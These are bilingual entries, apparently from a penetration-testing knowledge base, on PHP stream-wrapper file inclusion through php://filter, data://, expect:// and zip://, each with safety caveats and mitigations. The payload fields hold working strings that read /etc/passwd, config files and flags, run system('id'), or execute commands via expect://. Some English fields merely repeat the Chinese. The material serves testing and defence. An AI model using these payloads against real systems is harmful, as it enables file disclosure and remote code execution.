prerequisites.zh: 目标已确认运行 PHP，且用户输入进入文件读取或包含 API
prerequisites.en: The target is confirmed to run PHP and user input reaches a file-read or include API.

prerequisites.zh: 隔离实例提供无敏感 PHP 标记文件和文件访问审计
prerequisites.en: An isolated instance provides a nonsensitive PHP marker file and file-access auditing.

title.zh: Filter Wrapper 路径变体

description.zh: 按已确认路径模型逐条选择，把 config/flag/passwd 全部替换为测试标记；先验证读取 API，再决定 filter 语法是否适用。
description.en: Choose variants for the confirmed path model, replace every config, flag, and passwd target with a test marker, and establish the read API before testing filter syntax.

analysis.zh: 阳性需要 PHP 进程读取专用文件且解码内容与标记一致。错误、空白或任意 Base64 字符串是假阳性；还应区分源码读取与 include 执行。
analysis.en: A positive requires the PHP process to read the dedicated file and decoded content to match the marker. Errors, blanks, or arbitrary Base64 are false positives, and source read must remain distinct from include execution.

opsecTips.zh: 达到第一个固定标记后停止，不读取真实 config、flag、passwd 或 index.php。
opsecTips.en: Stop after the first fixed marker and do not read real config, flag, passwd, or index.php files.

opsecTips.zh: 测试后删除标记、清理应用缓存，并遮盖报告中的路径和编码内容。
opsecTips.en: Remove the marker, clear application caches, and redact paths and encoded content from the report afterward.

title.zh: 确认 PHP 文件读取 API

description.zh: 从输入追踪到具体读取/包含函数、wrapper 支持和规范文件根。
description.en: Trace input to the exact read or include function, wrapper support, and canonical file root.

title.zh: 读取单一 Base64 标记

description.zh: 替换所有敏感目标并选择一条匹配路径变体，保留请求与文件审计。
description.en: Replace every sensitive target, choose one matching path variant, and retain request and file audit.

attackChain.payload:
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../config.php
php://filter/convert.base64-encode/resource=../../../config.php
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=/flag.txt
php://filter/convert.base64-encode/resource=flag
php://filter/convert.base64-encode/resource=flag.txt
php://filter/convert.base64-encode/resource=/tmp/flag
php://filter/convert.base64-encode/resource=/var/www/html/index.php
php://filter/read=convert.base64-encode/resource=/flag
php://filter/resource=/etc/passwd
php://filter/resource=/flag
php://filter/resource=config.php

title.zh: 核对解码内容与访问来源
title.en: Verify decoded content and access provenance

description.zh: 解码响应并匹配固定标记哈希，同时确认读取由 PHP 进程发生。
description.en: Decode the response, match the fixed marker hash, and confirm the PHP process performed the read.

title.zh: 限制 Wrapper 与根目录
title.en: Restrict wrappers and the file root

description.zh: 修复后重放合法文件和全部变体，确认业务读取保留且 wrapper/越界目标拒绝。
description.en: After remediation replay valid files and all variants to preserve business reads while rejecting wrappers and out-of-root targets.

overview.zh: php://filter 可在文件读取前应用转换器，Base64 常用于让 PHP 源码以数据而非执行结果返回。风险取决于输入是否到达支持 wrapper 的 PHP 文件 API；URI 被接受或错误中出现 wrapper 名不足。
overview.en: php://filter applies transformations before a file read, and Base64 can expose PHP source as data rather than execute it. Risk depends on input reaching a wrapper-aware PHP file API; URI acceptance or a wrapper name in an error is insufficient.

vulnerability.zh: 根因是用户可控制读取/包含资源名，应用未限制 wrapper scheme 和规范路径。filter 将原本不可直接查看的 PHP 文件编码返回，路径遍历或绝对路径进一步扩大读取范围。
vulnerability.en: The cause is user control of a read or include resource without scheme and canonical-path restrictions. The filter can encode PHP files that would otherwise execute, while traversal or absolute paths expand the readable scope.

exploitation.zh: 先用根内纯文本标记确认文件数据流，再把一条 filter 变体指向无敏感 PHP 标记文件。关联文件访问、响应 Base64 与本地已知哈希。解码后固定标记匹配才成立；通用 500、空响应和 Base64 外观不是证据。
exploitation.en: First confirm the file flow with an in-root text marker, then point one filter variant to a nonsensitive PHP marker. Correlate file access, returned Base64, and a known local hash. Confirmation requires the decoded fixed marker; a 500, empty response, or Base64-looking text is not evidence.

mitigation.zh: 用服务端对象 ID 映射文件，不将用户输入传给通用文件 API；必须读取时只允许 file 资源、固定根目录和规范路径。禁用不需要的 wrapper，最小化 PHP 账户文件权限，并轮换任何已确认泄露的配置密钥。
mitigation.en: 用服务端对象 ID 映射文件，不将用户输入传给通用文件 API；必须读取时只允许 file 资源、固定根目录和规范路径。禁用不需要的 wrapper，最小化 PHP 账户文件权限，并轮换任何已确认泄露的配置密钥。

name.zh: PHP stdin、memory 与 temp 运行时流边界
name.en: PHP stdin, memory, and temp Runtime Stream Boundaries

description.zh: 验证文件型输入点是否接受 php://stdin、php://memory 与 php://temp，并区分进程标准输入、内存临时流和普通文件读取。
description.en: Tests whether a file-oriented sink accepts php://stdin, php://memory, or php://temp and distinguishes process input, in-memory temporary streams, and ordinary file reads.

prerequisites.zh: 目标 PHP API 接受通用 stream URI，并可观察实际打开的 wrapper
prerequisites.en: The target PHP API accepts generic stream URIs and the opened wrapper can be observed.

prerequisites.zh: 隔离请求体只含固定标记且不触发 include 执行
prerequisites.en: The isolated request body contains only a fixed marker and does not trigger include execution.

title.zh: PHP 运行时流 URI

description.zh: 逐条用于已确认的读取 API，stdin 请求体只放固定文本；memory/temp 通常是进程内新流，空结果可能是预期而非漏洞。
description.en: Use each with a confirmed read API and place only fixed text in stdin. memory and temp normally open new process-local streams, so empty output may be expected rather than vulnerable.

analysis.zh: 阳性边界是可控 stdin/流内容被目标读取或解释并改变服务器行为。memory/temp 的空结果和 wrapper 名回显是假阳性，不应按文件包含评级。
analysis.en: The positive boundary is controlled stdin or stream content being consumed or interpreted and changing server behavior. Empty memory or temp output and reflected wrapper names are false positives and should not be rated as file inclusion.

opsecTips.zh: stdin 只放一次随机文本标记，看到后立即停止，不提交 PHP 代码。
opsecTips.en: Place one random text marker in stdin and stop when observed; never submit PHP code.

opsecTips.zh: 测试后关闭请求连接并清理临时目录/进程缓存，确认没有持久文件。
opsecTips.en: Close the request and clear temporary directories or process caches afterward, confirming no persistent file remains.

title.zh: 确认读取或包含语义

description.zh: 定位 URI 到具体 PHP stream API，并记录输入体和 wrapper 基线。
description.en: Locate the URI's PHP stream API and record body and wrapper baselines.

title.zh: 逐流提交固定标记
title.en: Submit a fixed marker per stream

description.zh: 一次选择一个 URI，stdin 配合纯文本标记，memory/temp 不预填敏感数据。
description.en: Choose one URI at a time, pair stdin with plain marker text, and do not preload sensitive data into memory or temp.

attackChain.payload:
php://stdin
php://memory
php://temp

title.zh: 核对实际流与处理结果
title.en: Verify the actual stream and processing result

description.zh: 匹配 wrapper 打开日志、标记输出和是否发生解释，排除空流正常行为。
description.en: Match wrapper-open logs, marker output, and any interpretation, excluding normal empty-stream behavior.

title.zh: 固定资源类型并回归

description.zh: 修复后重放合法资源与三种 URI，确认只允许业务指定输入。
description.en: 修复后重放合法资源与三种 URI，确认只允许业务指定输入。

overview.zh: 这三种 wrapper 是 PHP 运行时 I/O 能力，不等同于本地文件读取。stdin 可引用进程标准输入，memory/temp 创建临时流；是否有安全影响取决于目标 API 是否 include 内容或复用了可控流。
overview.en: These wrappers expose PHP runtime I/O and are not equivalent to local-file reads. stdin references process input while memory and temp create temporary streams; impact depends on whether a sink includes content or reuses an attacker-controlled stream.

vulnerability.zh: 根因是业务把用户提供的 URI 交给通用 stream API，并在读取/包含之间没有固定语义。若 stdin 的请求体被 include，数据可跨入代码；若只是读取新建空 memory/temp，通常没有影响。
vulnerability.en: The cause is passing a user URI to a generic stream API without a fixed read-versus-include contract. Including stdin body can cross data into code, whereas reading a new empty memory or temp stream usually has no impact.

exploitation.zh: 从代码或跟踪确认 API 是 read 还是 include，再用纯文本随机标记逐条测试。记录打开的 wrapper、返回内容和 PHP 日志。只有标记跨越预期边界或被服务器解释时成立；URI 被接受、空响应或普通 echo 是假阳性。
exploitation.en: 从代码或跟踪确认 API 是 read 还是 include，再用纯文本随机标记逐条测试。记录打开的 wrapper、返回内容和 PHP 日志。只有标记跨越预期边界或被服务器解释时成立；URI 被接受、空响应或普通 echo 是假阳性。

mitigation.zh: 不要让用户选择 wrapper；为每个业务场景调用固定 API 和资源类型。禁止动态 include，请求体作为数据解析，关闭不需要的 wrapper，并以最小权限和资源限制运行 PHP。
mitigation.en: Do not let users choose wrappers; invoke a fixed API and resource type for each business case. Prohibit dynamic include, parse request bodies as data, disable unnecessary wrappers, and run PHP with least privilege and resource limits.

name.zh: PHP data Wrapper 内联内容包含
name.en: PHP data Wrapper Inline Content Inclusion

description.zh: 使用 data:// 与 data: 的 Base64/明文 PHP 内容验证文件包含点是否把内联数据交给 PHP 解释器。
description.en: Uses Base64 and plain PHP content in data:// and data: URIs to test whether a file-inclusion sink passes inline data to the PHP interpreter.

subCategory.zh: PHP data Wrapper 代码包含

prerequisites.zh: 仅在隔离 PHP 实例确认输入进入 include/require 而非普通读取
prerequisites.en: Testing occurs only on an isolated PHP instance after confirming input reaches include or require rather than an ordinary read.

prerequisites.zh: 验证内容改写为固定输出标记且 allow_url_include 配置可审计
prerequisites.en: Validation content is rewritten to fixed marker output and allow_url_include configuration is auditable.

title.zh: data Wrapper 编码与明文变体
title.en: Encoded and Plain data Wrapper Variants

execution.command:
data://text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=
data://text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+
data://text/plain;base64,PD9waHAgc2hvd19zb3VyY2UoJy9ldGMvcGFzc3dkJyk7ID8+
data://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcuJykpOyA/Pg==
data://text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFXyk7ID8+
data://text/plain;base64,PD9waHAgZmlsZV9nZXRfY29udGVudHMoJy9mbGFnJyk7ID8+
data://text/plain;base64,PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7ID8+
data://text/plain;base64,PD9waHAgZWNobyhmaWxlKCcvZmxhZycpKTsgPz4=
data://text/plain,<?php system('id'); ?>
data://text/plain,<?php include('/flag'); ?>
data://text/plain,<?php echo(file_get_contents('/flag')); ?>
data://text/plain,<?php show_source('/etc/passwd'); ?>
data://text/plain,<?php print_r(scandir('.')); ?>
data:text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=
data:text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+

description.zh: 原行保留用于审校。实际验证选择一行并将其解码/明文内容改为 `<?php echo 'MARKER'; ?>`，不读取文件、不列目录、不执行系统命令。
description.en: The original lines are retained for review. For validation choose one and replace decoded or plain content with a fixed PHP marker echo, with no file read, directory listing, or OS command.

analysis.zh: 阳性必须是修改后的固定 PHP echo 在服务器端执行。原 data URI 被读取或解码、500、源码回显均是假阳性；不得用原危险内容确认。
analysis.en: 阳性必须是修改后的固定 PHP echo 在服务器端执行。原 data URI 被读取或解码、500、源码回显均是假阳性；不得用原危险内容确认。

opsecTips.zh: 只选择一行并改写为固定 echo，得到标记后立即停止，禁止文件读取/命令执行。
opsecTips.en: Choose one line rewritten to fixed echo and stop after the marker; no file reads or command execution are permitted.

opsecTips.zh: 测试后清理请求日志中的内联内容、opcode 缓存和临时响应。
opsecTips.en: After testing clean inline content from request logs, opcode caches, and temporary responses.

title.zh: 确认 include 与配置前提

description.zh: 定位动态 include/require、allow_url_include 和 PHP 版本。
description.en: Identify dynamic include or require, allow_url_include, and PHP version.

title.zh: 提交单一固定 echo Wrapper

description.zh: 选择一条变体并替换全部危险内容，只输出随机固定标记。
description.en: Choose one variant, replace all dangerous content, and emit only a random fixed marker.

attackChain.payload:
data://text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=
data://text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+
data://text/plain;base64,PD9waHAgc2hvd19zb3VyY2UoJy9ldGMvcGFzc3dkJyk7ID8+
data://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcuJykpOyA/Pg==
data://text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFXyk7ID8+
data://text/plain;base64,PD9waHAgZmlsZV9nZXRfY29udGVudHMoJy9mbGFnJyk7ID8+
data://text/plain;base64,PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7ID8+
data://text/plain;base64,PD9waHAgZWNobyhmaWxlKCcvZmxhZycpKTsgPz4=
data://text/plain,<?php system('id'); ?>
data://text/plain,<?php include('/flag'); ?>
data://text/plain,<?php echo(file_get_contents('/flag')); ?>
data://text/plain,<?php show_source('/etc/passwd'); ?>
data://text/plain,<?php print_r(scandir('.')); ?>
data:text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=
data:text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+

title.zh: 确认 PHP 解释而非数据返回
title.en: Confirm PHP interpretation rather than data return

description.zh: 匹配编译/执行日志和固定输出，排除原样流读取、解码与回显。
description.en: Match compile or execution logs and fixed output, excluding raw stream reads, decoding, and reflection.

title.zh: 关闭 URL Include 并清理
title.en: Disable URL inclusion and clean up

description.zh: 修复后重放合法模板与 data 变体，确认模板保留且内联代码不解释。
description.en: After remediation replay a valid template and data variants to preserve templates while inline code is not interpreted.

overview.zh: data Wrapper 把 URI 内联内容暴露为流；普通读取只返回数据，include/require 才可能把 PHP 标签解释为代码。原样例包含读取和命令内容，但安全验证只需固定 echo 标记。
overview.en: data Wrapper 把 URI 内联内容暴露为流；普通读取只返回数据，include/require 才可能把 PHP 标签解释为代码。原样例包含读取和命令内容，但安全验证只需固定 echo 标记。

vulnerability.zh: 根因是用户可控制 include 目标且启用了允许 URL include 的配置或等价执行路径。应用未限制 wrapper scheme，导致内联数据从输入跨入 PHP 编译执行。
vulnerability.en: The cause is user control of an include target with URL inclusion enabled or an equivalent execution path. Missing wrapper allowlisting lets inline data cross from input into PHP compilation and execution.

exploitation.zh: 审计配置与 include 路径后，将一条样例内容替换为随机固定 echo，提交一次并关联 PHP 编译日志和响应标记。若只原样返回内容则是读取不是 RCE；错误、URI 接受或 Base64 解码本身是假阳性。
exploitation.en: After auditing configuration and the include path, replace one sample with a random fixed echo, submit once, and correlate PHP compilation logs and marker output. Raw content return is a read rather than RCE; errors, URI acceptance, or Base64 decoding alone are false positives.

mitigation.zh: 禁止动态 include 用户输入，关闭 allow_url_include 并限制可用 wrapper。模板通过服务端 ID 映射，数据流只用解析 API，不交给 PHP 编译器；应用身份最小权限并监控 data URI 进入 include。
mitigation.en: 禁止动态 include 用户输入，关闭 allow_url_include 并限制可用 wrapper。模板通过服务端 ID 映射，数据流只用解析 API，不交给 PHP 编译器；应用身份最小权限并监控 data URI 进入 include。

name.zh: PHP Expect Wrapper 命令边界

description.zh: 使用 expect:// 命令 URI 验证可选 Expect 扩展是否把文件型输入转换为操作系统进程执行。
description.en: Uses expect command URIs to test whether the optional Expect extension turns file-oriented input into operating-system process execution.

prerequisites.zh: 仅在隔离 PHP 实例确认 Expect 扩展已安装且输入进入通用 stream API
prerequisites.en: Testing occurs only on an isolated PHP instance after confirming the Expect extension and a generic stream sink.

prerequisites.zh: 可将命令改为固定标记输出并采集子进程审计
prerequisites.en: Commands can be replaced with fixed marker output and child-process auditing is available.

title.zh: Expect 命令 URI

description.zh: 原行仅说明命令边界。真实验证选择一行并替换为只输出随机固定标记的无害测试程序，不运行 whoami/cat/ls/pwd。
description.en: The original lines document the command boundary. For validation choose one and replace it with a harmless test program that emits a random fixed marker; do not run whoami, cat, ls, or pwd.

analysis.zh: 阳性要求 PHP 进程实际启动改写后的标记程序。Expect 扩展不存在、URI 解析失败、命令文字回显均是假阳性；不得运行原系统命令。
analysis.en: A positive requires the PHP process to start the rewritten marker program. Missing extension, URI parse failure, or reflected command text are false positives, and the original OS commands must not run.

opsecTips.zh: 仅在一次性容器运行单个固定标记程序，看到输出后停止。
opsecTips.en: Run one fixed-marker program only in a disposable container and stop when output appears.

opsecTips.zh: 测试后删除程序、终止残留子进程并核对无网络连接或临时文件。
opsecTips.en: Remove the program, terminate residual children, and verify no network connection or temporary file remains afterward.

title.zh: 审计 Expect 扩展与 Sink
title.en: Audit the Expect extension and sink

description.zh: 确认扩展、注册 wrapper、目标 API 和 PHP 服务身份。
description.en: Confirm the extension, registered wrapper, target API, and PHP service identity.

title.zh: 提交一个固定标记程序

description.zh: 替换原命令并只运行无害标记程序一次。
description.en: Replace the original command and run one harmless marker program once.

attackChain.payload:
expect://whoami
expect://cat /flag
expect://ls /
expect://pwd

title.zh: 确认 PHP 子进程因果链
title.en: Confirm the PHP child-process causal chain

description.zh: 匹配请求 ID、PHP 父进程、程序路径和固定输出，排除日志文本。
description.en: Match request ID, PHP parent process, program path, and fixed output, excluding log text.

title.zh: 移除扩展并回归

description.zh: 修复后重放合法文件 URI 和 Expect 样例，确认前者可用而后者拒绝。
description.en: After remediation replay a valid file URI and Expect samples to preserve the former while rejecting the latter.

overview.zh: expect:// 不是 PHP 默认常驻能力，只有安装 Expect 扩展且目标 API 支持 wrapper 时才适用。风险在于 stream URI 直接启动进程，不能从 wrapper 字符串或扩展文档推断目标可利用。
overview.en: expect is not a default always-present PHP capability. It applies only when the Expect extension is installed and the sink supports the wrapper. The risk is direct process creation from a stream URI, which cannot be inferred from a string or documentation.

vulnerability.zh: 根因是用户控制通用 stream URI，运行环境启用可执行 wrapper，应用未限制 scheme。PHP 服务身份因此可启动任意允许程序，影响受其系统权限和出站边界限制。
vulnerability.en: The cause is user control of a generic stream URI while an executable wrapper is enabled without a scheme allowlist. The PHP identity can start allowed programs, with impact constrained by OS privilege and egress.

exploitation.zh: 只读审计扩展与 wrapper 列表，在一次性实例创建固定标记程序并提交一条改写 URI。关联请求、wrapper 打开、子进程映像和标记输出。扩展缺失、未知 wrapper、错误或回显均为阴性。
exploitation.en: Read-only audit installed extensions and wrappers, create a fixed-marker program in a disposable instance, and submit one rewritten URI. Correlate request, wrapper open, child-process image, and marker output. Missing extension, unknown wrapper, errors, or reflection are negative.

mitigation.zh: 生产移除不需要的 Expect 扩展，文件功能只允许固定 file scheme 和对象映射，禁止用户选择 stream wrapper。PHP 运行身份最小权限，限制子进程与出站网络，并监控 Expect/异常进程。
mitigation.en: Remove the Expect extension when unneeded, allow only fixed file resources and object mapping, and never let users select stream wrappers. Apply least privilege, restrict child processes and egress, and monitor Expect or anomalous process creation.

name.zh: PHP Zip Wrapper 归档成员包含

description.zh: 使用伪装为图片/文本的 ZIP 容器和成员路径验证文件包含点是否从归档中读取或解释 PHP 成员。
description.en: Uses ZIP containers disguised as image or text files and member paths to test whether an inclusion sink reads or interprets a PHP member from an archive.

prerequisites.zh: 隔离实例允许上传测试 ZIP 且输入进入支持 zip:// 的文件 API
prerequisites.en: The isolated instance permits a test ZIP upload and input reaches a zip-aware file API.

prerequisites.zh: 归档成员只包含固定文本/PHP echo 标记并可完整清理
prerequisites.en: The archive member contains only fixed text or PHP echo marker and can be fully removed.

title.zh: Zip Wrapper 容器扩展名变体

description.zh: 逐容器名测试同一专用 ZIP，把 shell.php 内容改为固定文本或 echo 标记；先判断读取还是 include，不上传可接收命令的脚本。
description.en: 逐容器名测试同一专用 ZIP，把 shell.php 内容改为固定文本或 echo 标记；先判断读取还是 include，不上传可接收命令的脚本。

analysis.zh: 阳性边界分为成员可读与成员被 PHP 解释，两者影响不同。上传成功、外层扩展通过或 zip URI 被解析但无标记均是假阳性。
analysis.en: The positive boundary separates readable members from PHP-interpreted members, which have different impact. Upload success, accepted outer extension, or parsed URI without the marker is a false positive.

opsecTips.zh: 先用纯文本成员，确认读取后即停止；无专项批准不使用 PHP 标记。
opsecTips.en: Start with a plain-text member and stop after read confirmation; do not use a PHP marker without explicit approval.

opsecTips.zh: 测试后从上传目录、对象存储、缓存和备份队列删除所有归档。
